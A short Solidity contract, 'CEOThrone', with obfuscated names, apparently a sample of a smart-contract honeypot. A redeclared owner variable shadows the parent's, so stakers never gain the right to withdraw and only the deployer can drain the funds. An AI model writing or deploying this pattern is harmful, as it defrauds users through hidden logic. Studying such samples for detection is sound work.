pragma solidity ^0.4.19;


contract Ownable {
    address public _0x584fa4;
    function Ownable() public {_0x584fa4 = msg.sender;}
    modifier _0x34f99c() {require(msg.sender == _0x584fa4); _;
    }
}


contract CEOThrone is Ownable {
    address public _0x584fa4;
    uint public _0xfea9b9;


    function Stake() public payable {

        if (msg.value > _0xfea9b9) {
            _0x584fa4 = msg.sender;
            _0xfea9b9 = msg.value;
        }
    }

    function _0x3e886d() public _0x34f99c {

        msg.sender.transfer(this.balance);
    }
}